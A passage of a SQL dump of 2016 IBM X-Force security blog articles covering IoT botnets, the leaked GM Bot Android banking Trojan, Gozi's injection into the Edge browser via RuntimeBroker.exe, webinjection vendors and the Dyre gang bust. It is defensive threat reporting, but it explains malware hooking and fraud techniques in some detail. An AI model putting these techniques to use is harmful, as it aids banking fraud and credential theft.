world of mobile devices, we see malware making a quantum leap with overlay malware. This involves Trojans implementing a convincing social engineering effort to fool users into divulging payment login details, online banking credentials and payment card details right from their device. The malware is often bundled with spyware, turning it into a one-stop fraud shop. Vulnerability news was more of the same: The second half of 2015 saw an increase in disclosed vulnerabilities for a total of just under 9,000. This represents the highest number of vulnerabilities the X-Force team has seen and recorded in our  . In our experiences working with clients and prospects,   has seen that many organizations do not sufficiently monitor published vulnerabilities that may affect the technology protecting their data. As a result, they may be ignorant of the risk and impacts of a data breach. There are common reasons, however, why organizations are in the dark about these exposures and risks, including: With so much happening at once, there is renewed emphasis for security basics surrounding risk assessment and patching of vulnerabilities, protecting databases and implementing mitigating controls so that every organization can better handle risks.', '\'Cybercrime\', \'IBM X-Force Report\', \'IBM X-Force Research\', \'Threat Intelligence\', \'X-Force\'', 'https://securityintelligence.com/2015-ibm-x-force-report-breaches-without-borders-and-tales-from-the-cybercrime-underground/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (292, 'Thingbots: The Future of Botnets in the Internet of Things', 'Paul Sabanal', '2016-2-20', 'The Internet of Things (IoT) is upon us. Everything from cars to home appliances, watches and even children’s toys are being connected online. It is projected that by the year 2020, there will be more 25 billion  . Those numbers alone are enough to attract cybercriminals’ attention, but what is more relevant here is what these devices represent. It means more data to steal, more systems to take over and more money to be made. In the past, this same line of reasoning sparked the evolution of malware. In the dawn of the Internet, we saw the proliferation of mass-mailing worms, when prior to that we had only seen file infectors and  . When Internet use became increasingly widespread in the early 2000s, financially motivated attackers took notice. That’s when we started seeing the likes of botnets, exploit kits and ransomware. We believe the rise of IoT will bring another evolution in malware in the form of thingbots. Thingbots are botnets composed of infected IoT devices. These devices can be controlled by an owner to launch attacks, steal sensitive data or facilitate other malicious activities. We have already seen a few of these in the last couple of years. Due to their ubiquity and the fact that they are usually connected directly to the Internet, wireless routers and modems are the primary targets for thingbots. Other devices that were targeted included   cameras and network storage systems. Most of these devices use Linux as their operating system, and this allows attackers to take existing Linux malware and recompile it to target the specific architecture the device is running on. Access was gained on these devices mostly through Telnet default login credentials that the device owners left unchanged. There were also reports of infections through device vulnerabilities, as well. Distributed denial-of-service (DDoS) attacks were the primary use for the infected devices. We believe that the current crop of IoT malware has not displayed a fraction of its potential yet. We know and expect that it will definitely increase in number, and it’s not a matter of if but how the malware will increase in sophistication. So we ask: What are thingbots capable of in the future? And most importantly, how can we protect ourselves from them?', '\'IBM InterConnect\', \'InterConnect 2016\', \'Internet of Things (IoT)\', \'Thingbots\'', 'https://securityintelligence.com/thingbots-the-future-of-botnets-in-the-internet-of-things/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (293, 'Android Malware About to Get Worse: GM Bot Source Code Leaked', 'Limor Kessem', '2016-2-19', 'IBM X-Force threat intelligence has found that the source code for Android malware GM Bot was leaked on an underground board in December 2015. The leaked code for the malware and its control panel have since been further propagated to different users, making this popular Android Trojan accessible to fraudsters for free, with a tutorial and server-side installation instructions to match. GM Bot will be available to cybercriminals who can recompile the code, create new variants and use the leaked sources to build, sell or deploy this malware for fraud scenarios. How was this source code leaked? And why? In this particular case, it looks like the leak didn’t result from a dispute between criminals. Instead, it looks like it was the choice of one of GM Bot’s buyers. When it comes to cybercriminals selling malware in underground venues, black-hat vendors simply cannot control what their buyers may do with the malware once it is in their possession. As they say: Leaks happen! The exposure of GM Bot’s code is comparable to the source code leaks of PC Trojans that include  ,  ,   and others. While GM Bot may not be as prolific as the major banking Trojans mentioned here, it is definitely a game changer in the realm of mobile threats. Its source code leak, similar to the Zeus leak, is likely to give rise to many variations of this sort of malware. The reasoning behind leaking the code appears to be one buyer’s personal desire to enhance credibility in the underground boards. To be considered more credible or up their rank, criminals usually have to give something back to the fraudster community they’re a part of; in this case, it was a tutorial explaining the use of mobile malware for online banking fraud. The fraudster that leaked the code threw in an encrypted archive file of the GM Bot malware source. He indicated he would give the password to the archive only to active forum members who approached him. Those who received the password in turn passed it on to other, unintended users, so the actual distribution of the code went well beyond that discussion board’s member list. Where does that leave GM Bot’s creator? The original vendor already sold the rights to distribute what’s considered GM Bot v1 to another cybercriminal that peddles it in the underground for $500. That version is called  , and it is   among cybercriminals. According to X-Force threat intelligence, the code’s author moved on to working on a new version dubbed GM Bot v2.0, which is sold in financial fraud-themed underground boards. GM Bot is   that emerged in late 2014 in the Russian-speaking cybercrime underground. This Android malware’s differentiating capability is its deployment of overlay screens on top of running banking applications, with the goal of tricking users into entering their access credentials into a fake window that will grab and forward them to a remote attacker. Beyond that overlay screen capability, GM Bot can intercept SMS messages sent to the mobile devices it infects and act like spyware that grabs and exfiltrates data from infected devices. This makes GM Bot a banking Trojan for the Android OS since it enables cybercriminals to gather enough information for illicit money transfers out of victim accounts. GM Bot further allows criminals to customize fake screens, which enables them to harvest payment card information. This turnkey capability is the true differentiator. Previous mobile malware — before overlay became commercially available to fraudsters — could steal SMS codes, but those would have been meaningless without phishing schemes or a Trojan on the victim’s PC to steal access credentials. The reverse was also true: Phishers and PC Trojan operators could not facilitate fraudulent transactions without mobile malware to intercept the SMS codes or calls from the bank. In short, mobile banking Trojans such as GM Bot are a one-stop fraud shop for criminals: In the information security sphere, we often hear about cybercriminals sharing information and collaborating in underground boards. This case is an excellent example: Actors have access to cybercrime advice from a fraudster who knows his way around online fraud, along with the actual malware source code to help readers set up their own mobile botnet. While it is useful, the advice is not meant for the novice crowd. The post illustrates the value of the malware and how to monetize it, but the leaked malware and control panel source codes would not mean much to the nontechnical, inexperienced fraudster readers who never compiled malicious code on their own. Overall, the post’s author is addressing cybercriminals who either actively use banking Trojans or understand Trojan-facilitated online banking fraud. The subtext in the author’s post is clear: Using mobile malware is cheaper and safer than using banking Trojans for those who target personal bank accounts. In the post, the fraudster goes over some common hurdles encountered by cybercriminals who do not have access to victims’ genuine devices or operate Windows endpoint-based botnets. Those include the challenge of two-factor authentication codes sent via SMS, telephone banking call centers requesting replies to secret questions, having the right accent when calling an English-speaking bank or needing to forward a call without changing anything in the victim’s bank account. Per the post, the solution to these fraud prevention measures is not to outsource the necessary help to cybercrime-as-a-service (CaaS) vendors but rather to buy a mobile bot and use it to harvest the necessary information. The online banking scenario in the resulting cases is going to be account takeover — the initiation of the fraudulent transaction from a computer or mobile device the fraudster owns. The GM Bot mobile Trojan was initially   in October 2015. The malware was since detected and renamed by a few other security vendors, but the actual code base is the same and not considered to be a different Trojan. Some aliases GM Bot received are  ,  , Acecard and Slempo. Since technical analysis of this malware is already available from different sources, IBM X-Force mobile threat researchers only examined the leaked source and control panel. GM Bot’s botnet administration panel was rather interesting in its design to facilitate control over the incoming stolen data and further allow the criminal to create and deploy new injections to infected user devices. This section focuses on the control panel’s options and demonstrates the control and data collection capabilities cybercriminals have on infected devices once complex malware is installed. The following command examples can be sent from a GM Bot controller to the infected device directly from the attacker’s command-and-control (C&C) server. Each command is rather self-explanatory and shows that malware can control the SMS relay from infected mobiles, as well as the call forwarding. Banking malware uses these control options to deliver two-factor authentication codes and phone calls to the attacker’s number with no need to modify any details in the victim’s account. A cybercriminal operating GM Bot can also lock the phone’s screen and delay the victim’s ability to access the device. This is part of the tactics used by fraudsters when they plan to intercept two-factor authorization codes sent from the bank and want to prevent the victim from questioning the SMS. GM Bot is the sort of malware that also comes with spyware features; as such, it can get information from the device’s GPS location services or wipe user data from the device — two features that are easily sent by command lines. Reminiscent of the Zeus Trojan’s control panel, GM Bot botnet operators can also search their database for records that interest them, which can be sorted by the infected device’s origin country. Records include stolen information that is parsed into credit card details, lists of apps installed on infected devices, bank accounts the victims hold, other types of compromised accounts collected by the malware, data from online forms filled out by the victims and data stolen by customized HTML forms pushed to the victims. As mentioned earlier, GM Bot gains control over the infected phone’s SMS relay. With that capability, it can eavesdrop, intercept and send out new SMS messages as it pleases. In Android OS versions above v4.4, victims can see the SMS messages they receive, which means they might suspect something and contact their bank/service providers. Controlling the SMS relay also means fraudsters can mass-send SMS from that victim’s device (spamming or sending to premium numbers). The attacker can blacklist certain numbers from reaching the victim, such as the bank’s customer service numbers, for example. The options are available to the attacker from the control panel. Each option allows for further parameter definition in the simplistic user interface. The customizable part of the GM Bot is its ability to target new apps and entities by setting up new fake overlay screens (injections) directly from the control panel. That option is enabled by simply feeding the code into the user interface and dispatching it to the infected devices. The specific code will pop up upon the launch of the applications specified in the App Filter section. Note that for the more recent overlay Trojans circulating in the wild, some overlay windows are static, hard-coded into the malware. Additional screens are dynamically fetched from the configuration and the attacker’s C&C server in real time  They are launched as soon as infected users open the target banking application, their Google Play store app or any other app the attacker chooses to target. Some   X-Force mobile threat researchers worked with appear below. While the X-Force Exchange is kept up to date, C&C server addresses and the list of targeted entities can change from one attacker to the next since GM Bot is commercial malware that appears in a variety of versions. C&C server addresses may or may not be live. Bd8502a1f9934d0c1f7bb44f0b4fd7f7765798225bd2192f3fff76f5cb55259a\n 9425fca578661392f3b12e1f1d83b8307bfb94340ae797c2f121d365852a775e\n 960422d069c5bcf14b2acbefac99b4c57b857e2a2da199c69e4526e0defc14d7\n 306ca47fdf2db0010332d58f2f099d702046aa1739157163ee75177e1b9d5455\n Some extracts from the underground forum post appear in this appendix. The extracts were translated from Russian by   and modified slightly for readability.', '\'Android\', \'Android Security\', \'Banking Trojan\', \'GM Bot\', \'Malware\', \'Mobile Malware\', \'Mobile Security\', \'Trojan\'', 'https://securityintelligence.com/android-malware-about-to-get-worse-gm-bot-source-code-leaked/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (294, 'Social Security: Making the Most of Collaborative Defense With Threat Intelligence', 'Doron Shiloach', '2016-2-19', 'In the 1930s, the United States created the Social Security Administration to help fund a pension system for senior citizens with the aid of IBM’s   and accounting and payroll data expertise. No one could have anticipated that the Social Security number created for each U.S. citizen would one day become a prime target for cybercriminals. Some 80 years later in 2015, IBM Security brought about a new wave of social security, enabling collaborative defense to boost threat intelligence sharing with  . Recently, X-Force Exchange has introduced a number of capabilities that will further enhance users’ ability to be social and still gain better security. The open standards   and   are now implemented for observables and collections in X-Force Exchange. Public collections are now even more public and can be accessed without connecting to everybody on the Internet. There are a wealth of public collections on malware and other attack vectors created by our IBM X-Force researchers, indicated by a blue bar on the contributor avatar. These and other public collections can be easily imported to a security intelligence platform to reduce the time to action by creating a rule to produce an alert when indicators present in the collection are found in the infrastructure being monitored. Conveniently, such new rule sets are now available from the  , which is hosted on X-Force Exchange. \n The key to any collaboration is the element of trust. Without the ability to trust other participants in any   arrangement, users will doubt the reliability of the information being provided. As mentioned above, IBM X-Force researchers are now marked in the X-Force Exchange to call attention to trusted contributions. Analysis of current threats, malware and attack vectors are now available as information is updated by our researchers, who span not only the globe, but also a wide range of skills and experience. To form your own circle of trust, you can create a private group to share sensitive information with only those other users you choose. These users could be within your own company, an industry consortium or even a selection of colleagues spanning your entire career. Within a group, you can share a private collection to collaborate on the investigations and the associated threat indicators relevant to your network or industry. As an investigation grows, the information in the collection that supports that investigation will naturally expand as more threat indicators are discovered and additional analysis of the threat is completed. With   being so dynamic, it is important for security analysts and other consumers to be updated as new information is discovered. To that end, X-Force Exchange can now notify you as a collection is edited, whether it’s specific observables added to the collection, a new file attached, a new collection linked or changes made to the text description. With each of these, a notification email as well as a visual indication in the notification center alerts users, encouraging them to examine the collection to obtain the most up-to-date information. Just as the original Social Security program will continue to evolve, so must the social and collaborative aspects of the modern security community. To take your part in the collaborative defense of the future, visit   today.', '\'IBM X-Force Exchange\', \'Information Sharing\', \'Security Intelligence\', \'Threat Intelligence\', \'X-Force\'', 'https://securityintelligence.com/social-security-making-the-most-of-collaborative-defense-with-threat-intelligence/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (295, 'Gozi Banking Trojan Upgrades Build to Inject Into Windows 10 Edge Browser', 'Or Safran', '2016-2-18', 'IBM X-Force researchers have recently detected a new   build propagated to endpoints in the wild. Alongside some interesting changes made to the malware, the researchers reported that Gozi’s developer has successfully updated the Trojan’s code injection mechanism to implement form grabbing and webinjections in the Windows 10 Edge browser. Since a Windows 10 operating system upgrade is offered to home users at no cost, which has triggered a rather vast adoption of the platform, malware authors are hurrying to update their codes to deploy on Windows 10 endpoints. Moreover, since Win10 comes with a new browser,  , cybercriminals need the ability to seamlessly operate their malware on that software. With the ability to inject the Trojan’s code into the operating system’s and the browser’s processes, cybercriminals can control the browser for monitoring victim activity, form grabbing and webinjections, which are among the most powerful tools criminals have against unsuspecting victims. Within that context, Gozi is the most recent Trojan to achieve the ability to inject code into the Edge browser, but it is not the first. Tinba v3 can inject code into the Edge browser as well, although it has not been able to deploy webinjections yet. Ramnit, too, can inject code into Edge and deploy webinjections on that browser. One of the better-known examples is the Dyre Trojan, which was   for successful deployment on Windows 10 endpoints and code injection into the Microsoft Edge browser in November 2015, before the  . According to the research of Gozi’s new capability, the malware’s developer has found a new way to use the same overall code injection mechanism on the Win10 Edge browser as it did on previous Windows OS versions. The code behind this new capability can now be injected into the MicrosoftEdgeCP.exe process, which is the Edge browser’s process. In general, for Gozi-infected machines, every process created by explorer.exe or one of its child processes is patched in order to maintain Gozi’s infection, keylogging ability and other malicious control. Moreover, some child processes get specific attention from Gozi. Those will include extra code for other malicious features (see list below). Let’s look at the way Gozi’s developer has managed to work out this new capability. To inject malicious code to browser processes in Win10, the malware uses a number of hooks on the kernel32.dll. Gozi handles code injections differently when a browser process is already running and in cases where it is not yet open. In general, but not in Edge’s case, when an Internet browser process is already running, Gozi leverages CreateRemoteThread to inject code. In previous versions of the Windows OS, the default behavior would have explorer.exe as the parent process of the browser process, hence Gozi injected its malicious code into it. From there, it would rely on its hooks to infect the browsers through hooking CreateProcess APIs. In Windows 10, however, Gozi cannot perform the same trick since explorer.exe is not the parent process of the Edge browser. Gozi needed a new workaround for Windows 10. Its developer began by going to the new parent process and leveraging another process: RuntimeBroker.exe. The latter is the parent process of the Edge browser in Windows 10 machines. To ensure hooking happens properly no matter which browser is launched by the victim, following the injection of malicious code into the classic explorer.exe by the Gozi dropper, the Trojan further looks for each one of the following processes and injects itself into it. Note that for Edge, Gozi goes to RuntimeBroker.exe (see Figure 2). In Figure 3 below, we can see that Gozi has confirmed it will inject into the target process and calls on the CreateRemoteThead to begin the injection process. Note that the malicious code hooks the RuntimeBroker.exe process with the Gozi-style patches. Three of the central functions being hooked here are: As a result of hooking these functions, every child process of the poisoned RuntimeBroker.exe will be injected with Gozi’s code — including the Edge browser’s child process. To test and check that all the child functions are indeed hooked, we can review the Export Address Table (EAT) hooks and see the following functions on the list: WININET!HttpAddRequestHeadersA\n WININET!HttpAddRequestHeadersW\n WININET!HttpQueryInfoA\n WININET!HttpQueryInfoW\n WININET!HttpSendRequestA\n WININET!HttpSendRequestW\n WININET!InternetConnectA\n WININET!InternetConnectW\n WININET!InternetQueryDataAvailable\n WININET!InternetReadFile\n WININET!InternetReadFileExA\n WININET!InternetReadFileExW\n WININET!InternetSetStatusCallback\n WININET!InternetWriteFile\n ADVAPI32!CreateProcessAsUserA\n KERNEL32!CreateProcessA\n KERNEL32!CreateProcessAsUserW\n KERNEL32!CreateProcessW\n According to actual infections detected in 2016, the current new Gozi build is being propagated in the U.K., U.S. and South Africa. The analyzed sample’s MD5 is  . The   analysis of that sample shows that it was detected in 33 out of 55 security tools. The Gozi Trojan is one of the longest-standing banking Trojans in the wild today. It was first discovered in 2007, when it was operated by a closed group of developers and cybercriminals. Gozi was used for targeting banks with online banking wire fraud, mostly in English-speaking countries. Gozi’s v1 source code was leaked mistakenly by one of its developers in late 2010 when a team was working on a major upgrade. The leaked code was then repurposed in Trojans like   and Neverquest. The original Gozi v2 started appearing in the wild toward the end of 2010, using new webinjection mechanisms to attack European, U.K. and U.S. banks. In late 2012, Gozi was used in what was dubbed the Prinimalka variation at the hands of criminals who planned a major,  . In 2013, Gozi’s developers   to create high persistency through the computer’s MBR. In 2013, another variation of Gozi was detected in the wild with a MBR infector in tow. It was in that same year that the FBI got to some of the Gozi gang, capturing and charging three individuals with crimes related to the Gozi gang’s activities. One of those arrested   to the charges in September 2015. According to X-Force research, in May 2015, Gozi v2’s developers implemented major updates to the malware’s webinjection schemes and capabilities. In attacks on U.K. banks, Gozi v2 variants injected full-page replacements into the communication flow with the bank’s servers. Gozi typically injected a fake page requiring victims to change their password upon attempted login, and then added another social engineering screen asking for a one-time password/token code. In August 2015, Gozi   to its list of targets. Nowadays, the Trojan source code is believed to be used by a few cybercrime factions since it appears in a limited number of variations that are being developed and versioned separately. The updated injection mechanism for Gozi has been implemented on the same variation that attacked banks in Bulgaria last year. The significance of this new finding is that the Gozi project continues to be an active and sophisticated one, and that its new injection capabilities will allow it to seamlessly attack the growing number of users who update their endpoints to Windows 10 or switch to the Edge browser. It’s also important to keep in mind that not all banking malware variants have this capability yet. IBM X-Force research continues to follow developments to keep you up to date on the ever-evolving threat landscape.', '\'Banking Trojan\', \'Gozi Trojan\', \'Microsoft Edge\', \'Trojan\', \'Windows\', \'Windows 10\'', 'https://securityintelligence.com/gozi-banking-trojan-upgrades-build-to-inject-into-windows-10-edge-browser/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (296, 'Dark Web Suppliers and Organized Cybercrime Gigs', 'Limor Kessem', '2016-2-11', 'IBM X-Force researchers closely follow the activity and fraud methods of banking Trojans in the wild. In one of their recent findings, the team uncovered an interesting link between an underground webinjection vendor and three well-known cybercrime groups: the operators of the  , CoreBot and ZeusVM banking Trojans. The dark Web and its underground cybercrime-themed discussion boards have long been a fraud enablement center where professional criminals could congregate to peddle their online fraud tools, wares and services. A decade ago, cybercrime discussion boards were a bustling marketplace where both rookies and expert criminals would exchange information and buy and sell cybercrime-as-a-service (CaaS). Nowadays, after a few major   and the capture of banking Trojan authors such as those who created  ,  ,   and  , underground boardgoers are a lot more cautious. Gone are the expert-level patrons who used to frequent the open and semi-open boards, for obvious reasons. Newcomers typically run into novice actors and midlevel administrators in search of information and accomplices. But expert CaaS vendors are still part of the underground economy, and they provide other cybercriminals with verified commodities such as: Since these CaaS vendors understand the risk level involved with their profession, they carefully limit access to their services to a select few boards — only the most exclusive, such as communities that are closed off to newcomers and have extremely strict rules on the admissibility of new members. Some of the most popular CaaS commodities in the exclusive parts of the Dark Web are the services of expert webinjection writers who supply their skills to banking Trojan operators. Webinjections are code snippets that financial malware can force into otherwise legitimate Web pages by hooking the Internet browser. Once a browser has been compromised by the malware, attackers can use these injections to modify what infected users see on their bank’s pages or insert additional data input fields into legitimate login pages in order to steal information or mislead unsuspecting users. Whether made up of HTML code or JavaScript, webinjections are probably the most powerful social engineering tool available to cybercriminals who operate banking Trojan botnets. To be considered both high-quality and effective, these webinjections have to seamlessly integrate with the malware’s injection mechanism, display social engineering that corresponds with the target bank’s authentication and transaction authorization schemes and have the perfect look and feel to fool even the keenest customer eye. According to   researchers, when it comes to these tools, elite cybercrime gangs appear to buy from a limited number of experts who program and sell target-specific webinjections. Examining the content of Trojan configuration files may show that the same exact code is being used or fetched in real time from the same remote servers. Judging by the common injections used by a few major gangs, cybercriminals may develop the malware in-house, but they outsource the webinjection portion to black-hat CaaS vendors who specialize in writing this type of fraud-facilitating code. Other examples emerge from research on the inner workings of malware configurations, webinjections and fraud attack schemes. Research showed that Trojans such as Shifu, Neverquest and Dridex share some of the exact same injections or fetch the same ones from the same remote servers per the targeted bank. While research points to the possibility that the top cybercrime gangs buy webinjections from the same shady developers, more definitive proof was uncovered in one of the most exclusive underground boards via a top-tier injections vendor. IBM X-Force researchers noted that in a detailed forum post written in Russian, a cybercrime vendor was offering a rather elaborate set of quality webinjections to other members. The vendor operates a CaaS website through which he markets injections designed to target 53 bank brands in English-speaking countries: the U.S., the U.K., Australia and Canada. IBM X-Force obtained some references from the CaaS vendor’s website and analyzed the injections offered for sale. The results revealed that those exact injections are currently in use by prolific banking Trojans, namely Ramnit,   and a privately owned ZeusVM iteration. All these Trojans are generally believed to be operated by closed cybercrime groups. The injections are adapted to each bank’s look and feel and also require different details in each case. In almost all cases, the injection requires the victim to divulge their payment card details, secret questions, personally identifiable information (PII) and ID document numbers. For example, in the case of injections tailored to American banks, the vendor typically required card details, date of birth, mother’s maiden name and Social Security numbers. In the case of Australian banks, the vendor designed injections to require the details of identification documents on top of payment card information. Injections for U.K. and Canadian banks required victims’ telephone banking passwords and payment card PIN codes. While webinjections are used primarily to gather information for fraudulent wire transfers, attackers who buy these particular formats will also gather payment card data and other PII, which can be used for a variety of fraud scenarios, not just wire transfer fraud. When it comes to organized cybercrime, banking malware is no longer the work of the sole developer who wrote the code or a partner he or she has teamed up with. Crime factions are increasingly organized in the same fashion as legitimate businesses. It is not so surprising to see cybercrime gangs need extra help to achieve their goals faster, outsourcing work to external experts who specialize in supplying their specific needs while keeping their business discreet. Injection vendors are cybercriminals. In a publicized case, the individual who wrote webinjections for the Gozi Trojan was arrested and charged for his activity,   reported. He admitted to knowing what he was doing was against the law. Since different gangs use the same injections, it is safe to infer that injection authors cater to a number of groups and aim to make banking Trojan more effective. The authors continuously keep the injections current with the targeted banks’ or service providers’ website layouts and formatting, as well as the types of elements those entities require for the authorization of online transactions. After concluding that the vendor they discovered in a closed discussion board is the likely supplier of webinjections to at least three gangs, IBM X-Force researchers took action. They translated their findings into indicators of compromise (IOCs), which could then be integrated into antifraud  . Ongoing intelligence-based product enhancement is a proactive way to better protect customers against different types of malware reusing injections from the same vendor. Knowing that some cybercrime gangs use injections from the same provider can mean better malware protection. Once a security product is configured to look for a known webinjection, the malcode will be flagged even in new variants and other Trojan families. Security professionals can further extend this knowledge to other platforms, like SIEM and intrusion prevention systems, by writing custom rules using information about injections shared on platforms like  .', '\'Banking Trojan\', \'Cybercrime\', \'Dark Web\', \'Deep Web\', \'IBM X-Force Research\', \'Malware\', \'Trojan\', \'Webinjection\', \'X-Force\'', 'https://securityintelligence.com/dark-web-suppliers-and-organized-cybercrime-gigs/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (297, 'The Boy Who Cried Mobile Malware', 'Jonathan Dale', '2016-2-11', '“2013 is the year of mobile malware!” “2014 is the year of mobile malware!” “2015 is the year of mobile malware!” None of the past predictions about it being the year of mobile malware have come true. This has given companies and end users a false sense of mobile security. But will 2016 be the    ? Past scare tactics and speculation have made IT numb and slow to take proactive protection measures for when the wolf turns out to be real and the sky actually starts falling. What can change the current state of being? Our attention will be captured by the exact thing that got us to pay attention in the early 2000s: ILOVEYOU. It’s true: Business PCs were connected to the outside world for years before they were equipped with antivirus protection. It was the ILOVEYOU virus that made everyone stand at attention and take up arms. When a virus infects 55 million unsuspecting users, causing an estimated $10 billion in economic damage, you don’t go back to bed so easily. IT was awakened to the new world of vulnerability that ILOVEYOU wrought on businesses. Quite frankly, it should not have been the wake-up call it was. The writing was already on the wall with several smaller viruses such as Michelangelo and Melissa, which made headlines in the 1990s. To date, we can safely say that mobile malware has been more of an annoyance than a major headache. In 2010, malware began targeting the most modern OSs. Jumping a few years to 2015, you could easily find news headlines filled with mobile malware: These threats represent the Michelangelos and Melissas of the modern mobile computing age. If history is prone to repeating itself, we know ILOVEYOU_MORE isn’t far away. One of the largest misconceptions around mobile malware is that it isn’t influenced by   and thus may not be as threatening. But while the differences between PC and mobile malware vary, and certain malware types remain within their particular domain, there are instances of malware that are easily translatable between the two or that can originate in one system and infiltrate the other. One such malware type is a remote-access Trojan (RAT), which infects a connected mobile device and burrows through the security perimeter of an organization to infect PCs. Additionally, very sophisticated cybercriminals are using spear phishing to target influential individuals who are all about app usage for running business. With the growth of application use — and the lack of stringent app policies and permissions awareness — attackers are swimming in opportunities to infiltrate organizations and gain control of mobile devices. Many organizations simply see mobile malware as a one-off threat that’s detrimental only to a single user rather than part of a coordinated enterprise attack. By the time IT sees the mobile threat, the damage is already done across the ecosystem. Realizing the mobile malware threat is very real, the analyst community is leading the market in education. “ ” had this to say about threat management: “When a threat compromises one device or app that an employee uses, there are immediate implications for any other corporate system the device or app is connected to. [Infrastructure and operations] pros and their security peers need unified threat management — or visibility and control across all of the employee’s workforce tools — providing the ability to take action immediately and reduce the potential threat.”\n \n We don’t know for certain that the ILOVEYOU malware will make a comeback, but the warning signs and swell of news coverage have risen exponentially since the calendar flipped. Consider these three factors: The number of mobile devices will grow, the number of mobile app downloads is already in the hundred-billion range and half of all companies have   during mobile app development. ILOVEYOU 2.0 isn’t certain, but I wouldn’t bet against it. Here are some final tips and considerations when deciding whether to be the windshield or the bug:', '\'Malware\', \'Mobile\', \'Mobile Malware\', \'Mobile Security\'', 'https://securityintelligence.com/the-boy-who-cried-mobile-malware/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (298, 'Dyre Straits: Group Behind the Dyre Trojan Busted in Moscow?', 'Limor Kessem', '2016-2-9', 'On Feb. 6, 2016,   broke an exclusive story about what appears to be a law enforcement raid that may have ended the activity of the cybercrime gang operating the Dyre banking Trojan. The story was followed up by a   article with hints about arrests in the top echelon of the Dyre crew and a possibility that the malware’s source code was leaked. Reuters reports that a police raid took place in November 2015 in a downtown Moscow high-rise. The operation reportedly took place inside the offices of a film distribution and production company called 25th Floor, which is, ironically, in the midst of producing a movie called “Botnet,” loosely based on a 2010 cybercrime case. Who executed the raid? 25th Floor’s CEO declined to comment on the case. A spokesman for the Russian Interior Ministry’s cybercrime unit denied involvement in the case. And the FSB, Russia’s main intelligence service, had no comment to offer reporters. The investigation was apparently aided by Moscow-based Kaspersky Lab; the security vendor reportedly plans to unveil details about the case in an annual user conference this week. In the interim, security professionals and past victims of the gang operating the Dyre Trojan await news on what seems to be the genuine disruption of a major organized cybercrime ring that has robbed financial institutions of millions of dollars in the past two years. \n As details of the investigation aren’t yet public, here’s what we know about Dyre’s current status based on IBM Security insights gleaned from across the globe. IBM X-Force researchers indicate that Dyre, which has been a constantly  , fell silent in November 2015. According to  , malware infection rates dropped sharply in mid-November, with new user infections appearing in the single digits per day at most. Beyond the drop in new infections, which signified the halt of spam/exploit kit campaigns, Dyre’s configuration update servers and its real time webinjection server were both disconnected from the Internet as the malware ceased generating attempted fraudulent transactions. A week later, in late November, Dyre’s redirection attack servers also went dark. It has been close to three months now since Dyre went silent. This in and of itself could have been a pause taken by its operators, an occurrence that happens from time to time; in September 2015, Dridex, too, went silent for almost a month. But cybercrime gangs like Dyre do not typically stay out of the game for three whole months unless they are in trouble. And trouble is apparently what befell the Dyre crew in Moscow last November. Dyre is considered one of the most advanced banking Trojans active in the wild today. Beyond the technical level of its attacks, Dyre is   and has made its mark as the most active Trojan family in 2015, according to IBM Trusteer data. If the gang operating Dyre has indeed been apprehended in Russia, the event will go down as one of the most significant cybercrime busts in history. More than its magnitude in terms of the fraud losses that will be spared, it will be one of the most noteworthy operations carried out against cybercrime on Russian soil by Russian authorities. In the past two years, Dyre has been used at the hands of its malevolent owners to defraud banks and their customers of many millions of dollars since its emergence in 2014. In early 2015, Dyre was  , robbing companies of sums that ranged from $500,000 to $1.5 million each. In May 2015, Dyre was implicated in the   from Irish budget airline Ryanair. A world without Dyre would definitely be safer for the financial sector in just about every country where the malware regularly attacked banks, especially in the U.K., the U.S., Australia, Spain and other parts of Europe. But Dyre’s absence will also give a bigger market share to other malware like Dridex, for example, which, according to IBM X-Force researchers, has been enhancing its attack methods to match Dyre’s and focusing on high-value business and corporate accounts in the U.K. and the U.S., which closely resembles Dyre’s path through the year before the raid. Rumors of a possible Dyre source code leak remain unconfirmed.', '\'Advanced Threats\', \'Banking Trojan\', \'Dyre\', \'Dyre Wolf\', \'Financial Industry\', \'Fraud\', \'IBM X-Force Research\', \'Kaspersky Lab\', \'Malware\', \'Trojan\', \'X-Force\'', 'https://securityintelligence.com/dyre-straights-group-behind-the-dyre-trojan-busted-in-moscow/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (299, 'IBM X-Force Security Research in the Spotlight at InterConnect 2016', 'Pamela Cobb', '2016-2-9', 'At  , security research is stepping to the forefront with significant representation from the  . The team covers skills and interest areas from vulnerabilities to malware to cloud security and everything in between. If you’re attending InterConnect, take a moment to look at these original security research topics from our experts in X-Force. There’s been no shortage of coverage of the Internet of Things (IoT) and the potential security challenges presented therein. When the midnight toll on Dec. 31 ushered in 2016, I checked out the window and sighed again at the lack of jetpacks. While we’re not zooming around the skyways with combustible fuel strapped to our backs, in some parts of the globe we’re sitting back as driverless cars chauffeur us to and from our destinations. To learn more about the potential hazards of these connected vehicles, check out “ ” with Martin Borrett and Giuseppe Serio. If you want to get more to the root of IoT and how this collection of nonstandard technologies can introduce new hazards that are often overlooked with standard testing, check out “ ” with Charles Henderson. In this session, you’ll hear real-world stories about penetration test findings, how disaster was averted, top vulnerabilities you need to know about today and how to build an effective testing program capable of handling IoT scenarios. Botnets have been troublesome for years, and the emergence of thingbots has raised the stakes. Not only are thingbots used mainly for spamming and distributed denial-of-service (DDoS) attacks, but they also serve a more sophisticated purpose unique to the nature of the things being exploited. Learn more in “ ” with X-Force researcher Paul Sabanal. Earlier this month, the IBM X-Force Ethical Hacking team, led by Paul Ionescu, produced a fascinating paper on penetration testing a  . Learn more details from Paul in his session “ .” The ubiquity of cloud computing has brought new challenges between public and private clouds. To learn more about cloud security and how to bolster defenses in a both public and private clouds, check out what Brad Harris has to say in “ .” Our X-Force malware researchers have been busy with so many new threats in the market, and we’ve got several sessions scheduled to reveal more about these insidious threats. A nice malware overview from 2015 and predictions for 2016 come from Limor Kessem in “ .” She’ll also lead the charge to drill down a little deeper on the Dyre 